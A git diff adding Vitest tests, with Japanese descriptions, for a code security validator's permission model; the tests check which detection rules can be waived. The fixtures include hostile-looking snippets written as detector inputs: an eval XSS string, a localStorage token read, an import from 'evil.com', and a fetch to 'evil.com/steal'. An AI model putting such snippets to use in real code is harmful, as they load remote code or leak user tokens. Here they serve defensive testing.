@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest'
 import { analyzeCodeSecurity } from '../src/analyzer.js'
-import { CodeSecurityService } from '../src/index.js'
+import { CodeSecurityService, NEVER_ALLOWABLE_RULES, ALLOWABLE_RULES } from '../src/index.js'
 import { adjustViolationSeverity, determineFileContext } from '../src/utils/file-context.js'
 import type { FileContext } from '../src/types.js'
 
@@ -1065,5 +1065,264 @@ describe('Issue #25 - immersiveweb.dev は許可ドメイン', () => {
     const signals = analyzeCodeSecurity(code)
 
     expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
+  })
+})
+
+describe('WorldPermissions モデル対応', () => {
+  const service = new CodeSecurityService()
+
+  describe('allowedCodeRules で許可可能ルールの violations が除外される', () => {
+    it('no-obfuscation を allowedCodeRules に指定すると violations から除外される', () => {
+      const code = `
+        const decoded = atob('ZXZpbCBjb2Rl')
+      `
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-obfuscation'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-obfuscation')).toHaveLength(0)
+      expect(result.violations.warnings.filter(v => v.rule === 'no-obfuscation')).toHaveLength(0)
+    })
+
+    it('no-dangerous-dom を allowedCodeRules に指定すると violations から除外される', () => {
+      const code = `
+        document.body.innerHTML = '<div>hello</div>'
+      `
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-dangerous-dom'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-dangerous-dom')).toHaveLength(0)
+    })
+
+    it('no-navigator-access を allowedCodeRules に指定すると violations から除外される', () => {
+      const code = `
+        navigator.mediaDevices.getUserMedia({ video: true })
+      `
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-navigator-access'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-navigator-access')).toHaveLength(0)
+    })
+
+    it('複数の allowedCodeRules を同時に指定できる', () => {
+      const code = `
+        const decoded = atob('data')
+        document.body.innerHTML = decoded
+      `
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-obfuscation', 'no-dangerous-dom'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-obfuscation')).toHaveLength(0)
+      expect(result.violations.critical.filter(v => v.rule === 'no-dangerous-dom')).toHaveLength(0)
+    })
+  })
+
+  describe('NEVER_ALLOWABLE_RULES は allowedCodeRules で指定しても除外されない', () => {
+    it('no-eval を allowedCodeRules に指定しても violations に残る', () => {
+      const code = `eval("alert('xss')")`
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-eval'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-eval').length).toBeGreaterThan(0)
+      expect(result.permissionWarnings).toEqual(
+        expect.arrayContaining([
+          expect.stringContaining('no-eval'),
+        ])
+      )
+    })
+
+    it('no-storage-access を allowedCodeRules に指定しても violations に残る', () => {
+      const code = `localStorage.getItem('token')`
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-storage-access'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-storage-access').length).toBeGreaterThan(0)
+    })
+
+    it('no-external-import を allowedCodeRules に指定しても violations に残る', () => {
+      const code = `import malicious from 'https://evil.com/hack.js'`
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-external-import'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-external-import').length).toBeGreaterThan(0)
+    })
+  })
+
+  describe('allowedDomains で指定ドメインが no-unauthorized-domain を発生させない', () => {
+    it('worldPermissions.allowedDomains に指定したドメインは許可される', () => {
+      const code = `
+        fetch('https://api.example.com/data')
+      `
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedDomains: ['api.example.com'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
+    })
+
+    it('allowedDomains に指定されていないドメインは引き続き検出される', () => {
+      const code = `
+        fetch('https://evil.com/steal')
+      `
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedDomains: ['api.example.com'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain').length).toBeGreaterThan(0)
+    })
+
+    it('manifestConfig.permissions と worldPermissions.allowedDomains がマージされる', () => {
+      const code = `
+        fetch('https://api.example.com/data')
+        fetch('https://cdn.custom.com/asset.js')
+      `
+
+      const result = service.validate({
+        code,
+        manifestConfig: {
+          permissions: {
+            network: {
+              allowedDomains: ['api.example.com'],
+            },
+          },
+        },
+        worldPermissions: {
+          allowedDomains: ['cdn.custom.com'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
+    })
+  })
+
+  describe('worldPermissions 未指定時に現行動作と同じ', () => {
+    it('worldPermissions を指定しない場合は従来通りの動作', () => {
+      const code = `
+        const decoded = atob('data')
+        fetch('https://evil.com/steal')
+      `
+
+      const resultWithout = service.validate({ code })
+      const resultWithEmpty = service.validate({ code, worldPermissions: {} })
+
+      // 両方とも同じ violations を検出する
+      expect(resultWithout.violations.critical.length).toBe(resultWithEmpty.violations.critical.length)
+      expect(resultWithout.valid).toBe(resultWithEmpty.valid)
+      expect(resultWithout.permissionWarnings).toBeUndefined()
+      expect(resultWithEmpty.permissionWarnings).toBeUndefined()
+    })
+  })
+
+  describe('無効なルール指定時に permissionWarnings が返る', () => {
+    it('NEVER_ALLOWABLE_RULES を指定すると警告が返る', () => {
+      const code = `const x = 1`
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-eval', 'no-storage-access'],
+        },
+      })
+
+      expect(result.permissionWarnings).toBeDefined()
+      expect(result.permissionWarnings).toHaveLength(2)
+      expect(result.permissionWarnings).toEqual(
+        expect.arrayContaining([
+          expect.stringContaining('no-eval'),
+          expect.stringContaining('no-storage-access'),
+        ])
+      )
+    })
+
+    it('不明なルール名を指定すると警告が返る', () => {
+      const code = `const x = 1`
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-unknown-rule'],
+        },
+      })
+
+      expect(result.permissionWarnings).toBeDefined()
+      expect(result.permissionWarnings).toEqual(
+        expect.arrayContaining([
+          expect.stringContaining('no-unknown-rule'),
+          expect.stringContaining('不明なルール'),
+        ])
+      )
+    })
+
+    it('有効な ALLOWABLE_RULES のみ指定した場合は permissionWarnings なし', () => {
+      const code = `const x = 1`
+
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-obfuscation', 'no-dangerous-dom'],
+        },
+      })
+
+      expect(result.permissionWarnings).toBeUndefined()
+    })
+  })
+
+  describe('NEVER_ALLOWABLE_RULES / ALLOWABLE_RULES 定数の整合性', () => {
+    it('NEVER_ALLOWABLE_RULES と ALLOWABLE_RULES に重複がない', () => {
+      const neverSet = new Set<string>(NEVER_ALLOWABLE_RULES)
+      for (const rule of ALLOWABLE_RULES) {
+        expect(neverSet.has(rule)).toBe(false)
+      }
+    })
+
+    it('NEVER_ALLOWABLE_RULES は 9 ルール', () => {
+      expect(NEVER_ALLOWABLE_RULES).toHaveLength(9)
+    })
+
+    it('ALLOWABLE_RULES は 8 ルール', () => {
+      expect(ALLOWABLE_RULES).toHaveLength(8)
+    })
   })
 })
